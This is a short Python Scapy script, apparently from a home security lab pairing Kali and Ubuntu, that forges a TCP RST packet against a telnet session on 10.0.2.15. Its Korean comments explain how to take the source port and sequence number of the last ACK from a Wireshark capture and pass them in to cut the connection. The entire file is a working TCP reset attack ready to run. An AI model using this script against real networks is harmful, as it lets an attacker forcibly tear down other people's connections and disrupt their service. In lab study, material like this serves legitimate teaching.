from scapy . all import *

rst = IP (dst = "10.0.2.15") / TCP (sport = int (sys . argv [1]), dport = 23, seq = int (sys . argv [2]), flags = "R")

send (rst)


# 사용 법 python rst.py 47588 2757673167
# ubuntu 의 와이어샤크로 칼리와 통신한 패킷을 확인 후 마지막으로 칼리가 보낸 ACK패킷의 src와 seq를 확인하여 인자값으로 넘겨 준다.
# 사용 법 python rst.py src seq

